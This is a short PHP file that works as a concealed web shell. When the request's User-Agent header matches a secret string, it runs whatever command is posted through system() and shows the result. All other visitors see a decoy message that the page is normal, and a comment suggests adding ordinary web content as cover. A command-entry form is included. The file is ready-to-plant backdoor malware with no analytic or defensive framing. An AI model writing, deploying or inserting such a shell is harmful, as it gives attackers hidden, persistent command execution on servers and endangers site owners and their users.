<?php
if ($_SERVER['HTTP_USER_AGENT'] == 'SetYoupasswordhere') {
	if (isset($_POST["cmd"])) {
	echo '<pre>';
	system($_POST["cmd"]);
}
}else{
	// You may put the normal web contents here.
	die("A normal web page contents!");
}
?>
<!-- Use the terminal based or web based UI -->
<form action="" method="POST">
<input type="text" name="cmd">
<button>Execute</button>
</form>
